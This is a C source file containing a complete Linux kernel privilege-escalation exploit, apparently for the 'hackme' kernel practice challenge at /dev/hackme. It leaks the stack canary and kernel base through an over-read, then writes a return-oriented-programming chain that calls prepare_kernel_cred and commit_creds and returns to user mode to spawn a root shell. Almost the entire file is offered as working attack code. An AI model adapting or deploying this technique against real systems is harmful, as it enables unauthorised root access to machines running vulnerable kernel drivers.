#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>

#define CANARY_SIZE 0x8
#define BUF_MAX 0x180
#define CANARY_OFFSET 0x80

void pop_shell(void);

uint64_t g_cs, g_rflags, g_sp, g_ss;
uint64_t g_rip = (uint64_t) pop_shell;
uint64_t kernel_base = 0;

// ROP Offsets
const uint64_t g_pop_rdi      = 0x006370;         // pop rdi; ret;
const uint64_t g_pop_rax      = 0x004d11;         // pop rax; ret;
const uint64_t g_pop_rbx      = 0xd92f;           // pop rbx; pop rbp; ret;
const uint64_t g_pop_rdx      = 0x007616;         // pop rdx; ret;
const uint64_t g_call_rax     = 0xc0f2be;         // call rax; pop rbp; ret;
const uint64_t g_jmp_rax      = 0x00005b;         // jmp rax;
const uint64_t g_mov_rax_rsi  = 0x00db06;         // mov rsi, rax; mov rax, rsi; pop rbp; ret;
const uint64_t g_pop_rsi      = 0x000423;         // pop rsi; pop rbp; ret;
const uint64_t g_mov_rdx_rdi  = 0x2010ba;         // mov rdi, rdx; call rsi;
const uint64_t g_mov_rsi_rdi  = 0x1bb40;          // mov rdi, rsi; call qword ptr [0xffffffff820400a8]; pop rbp; ret;
const uint64_t g_mov_rax_rbx  = 0xd928;           // mov qword ptr [rbx + 0xd8], rax; pop rbx; pop rbp; ret; 
const uint64_t g_add_rax_ecx  = 0x01604d;         // add ecx, dword ptr [rax + 9]; ret;
const uint64_t g_add_rdx_ebx  = 0x01604d;         // add ebx, dword ptr [rdx + 0x5d]; ret;
const uint64_t g_add_rdx_eax  = 0x15aa5;          // add eax, dword ptr [rdx]; ret;
const uint64_t g_add_r8_rax   = 0xea1d;            // add rax, r8; pop r13; pop rbp; ret;
const uint64_t g_add_rdi_rax  = 0x12551;           //add rax, rdi; ret;
// const uint64_t g_add_rax_rdx  = 0x15aa4;          // add rax, qword ptr [rdx]; ret;
// const uint64_t g_add_rax_eax  = 0xf889a2;         // add eax, dword ptr [rax]; sahf; ret
const uint64_t g_mov_rdi_rdx  = 0x1a635;          // mov rdx, qword ptr [rdi + 0x18]; test rdx, -2; je 0x21a645; xor eax, eax; ret;
// Function Symbols
const uint64_t g_swapgs_func  = 0x200f26;
const uint64_t g_commit_creds_symtab = 0xf87d90;
const uint64_t g_prepare_kernel_cred_symtab = 0xf8d4fc;
// Maybes
// 0xffffffff8100aeda: mov ecx, 0x15; mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; pop rbp; ret; 
// 0xffffffff81007690: mov ecx, 0x200; xor eax, eax; rep stosq qword ptr [rdi], rax; ret; 
// const uint64_t g_mov_rax_rdi  = 0x6bf203;         // INVALID mov rdi, rax; mov qword ptr [rsi + 0x140], rdi; pop rbp; ret; 


int dev_open(const char *devname) {
    int fd = open(devname, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s.", devname);
        exit(EXIT_FAILURE);
    }
    return fd;
}

void pop_shell(void) {
    uid_t uid = getuid();
    printf("[+] Shell UID: %u\n", uid);
    if (uid != 0) {
        fprintf(stderr, "[-] Failed to escalate priveleges.");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);  // Exit pre-emptively to avoid segmentation fault.
}

bool is_canary(uint64_t leak) {
    uint16_t prefix = leak >> 48;
    uint8_t null_byte = leak & 0xff;
    return ((prefix != 0xffff) && (null_byte == 0) && (prefix != 0));
}

uint64_t leak(int fd) {
    size_t   bytes_read  = 0;
    uint64_t canary      = 0;

    int size = BUF_MAX / 8;
    uint64_t leak[size + 10];
    bytes_read = read(fd, leak, BUF_MAX);
    if (bytes_read < 0) {
        fprintf(stderr, "[-] Failed to read.");
        goto LEAK_EXIT;
    }

    printf("[+] Beginning leak:\n");
    printf("\tOffset:\tLeak Data\n");
    /* For whatever reason, the canary appears three times in the leak. Once
       inside the `tmp` variable on the stack (improper initialization?), once
       0x80, again at 0xf0 for a different stack frame. The 0x80 location is
       actual canary location offset
    */
    for (int idx = 0; idx < size; idx++) {
        printf("\t0x%lx:\t0x%016lx", idx * sizeof(canary), leak[idx]);
        if ((idx * sizeof(canary)) == 0x130) {
            kernel_base = leak[idx] & 0xfffffffffff00000;
            printf("[+] Kernel Base: %016lx", kernel_base);
        }
        if (is_canary(leak[idx])) {
            printf("  CANARY CANDIDATE");
            canary = leak[idx];
        }
        printf("\n");
    }
    printf("[+] Leak complete\n");

LEAK_EXIT:
    return canary;
}

void save_state(void) {
    printf("[+] Saving state...\n");
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_cs, cs;"
        "mov g_ss, ss;"
        "mov g_sp, rsp;"
        "pushf;"
        "pop g_rflags;"
        ".att_syntax;"
    );
    printf("[+] State saved.\n");
}

void exploit(int fd, uint64_t canary) {
    int size = BUF_MAX / 8;
    uint8_t idx = CANARY_OFFSET / 8;
    uint64_t payload[size * 2];

    if (kernel_base == 0) {
        printf("[-] Kernel Base not found.");
        exit(0);
    }

    payload[idx++] = canary;
    payload[idx++] = 0x4141414141414141;
    payload[idx++] = 0x4242424242424242;
    payload[idx++] = 0x4343434343434343;
    payload[idx++] = kernel_base + g_pop_rax;
    payload[idx++] = kernel_base + g_prepare_kernel_cred_symtab;
    payload[idx++] = kernel_base + g_pop_rdx;
    payload[idx++] = kernel_base + g_prepare_kernel_cred_symtab;
    payload[idx++] = kernel_base + g_add_rdx_eax;
    payload[idx++] = kernel_base + g_pop_rdi;
    payload[idx++] = 0xffffffff00000000;
    payload[idx++] = kernel_base + g_add_rdi_rax;
    payload[idx++] = kernel_base + g_pop_rdi;
    payload[idx++] = 0x0;
    payload[idx++] = kernel_base + g_jmp_rax;
    payload[idx++] = kernel_base + g_mov_rax_rsi;
    payload[idx++] = 0;
    // payload[idx++] = kernel_base + g_pop_rax;
    // payload[idx++] = (kernel_base + 0x1000000) / 2;
    // payload[idx++] = kernel_base + g_mov_rsi_rdi;
    // payload[idx++] = 0;
    payload[idx++] = kernel_base + g_pop_rax;
    payload[idx++] = kernel_base + g_commit_creds_symtab;
    payload[idx++] = kernel_base + g_pop_rdx;
    payload[idx++] = kernel_base + g_commit_creds_symtab;
    payload[idx++] = kernel_base + g_add_rdx_eax;
    payload[idx++] = kernel_base + g_pop_rdi;
    payload[idx++] = 0xffffffff00000000;
    payload[idx++] = kernel_base + g_add_rdi_rax;
    payload[idx++] = kernel_base + g_mov_rsi_rdi;
    payload[idx++] = 0;
    payload[idx++] = kernel_base + g_jmp_rax;
    payload[idx++] = kernel_base + g_swapgs_func;
    payload[idx++] = 0;
    payload[idx++] = 0;
    payload[idx++] = g_rip;
    payload[idx++] = g_cs;
    payload[idx++] = g_rflags;
    payload[idx++] = g_sp;
    payload[idx++] = g_ss;

    printf("Payload size: %d\n", (idx * 8));

    printf("[+] Delivering payload...\n");
    write(fd, payload, (idx * 8));
}

int main(int argc, char **argv) {
    int      devfd      = 0;
    uint64_t canary     = 0;

    devfd = dev_open("/dev/hackme");
    canary = leak(devfd);
    if (canary == 0) {
        fprintf(stderr, "[-] Failed to leak canary.\n");
        goto EXIT;
    }
    printf("[+] Canary: 0x%016lx\n", canary);
    save_state();
    exploit(devfd, canary);

EXIT:
    close(devfd);
    return 0;
}
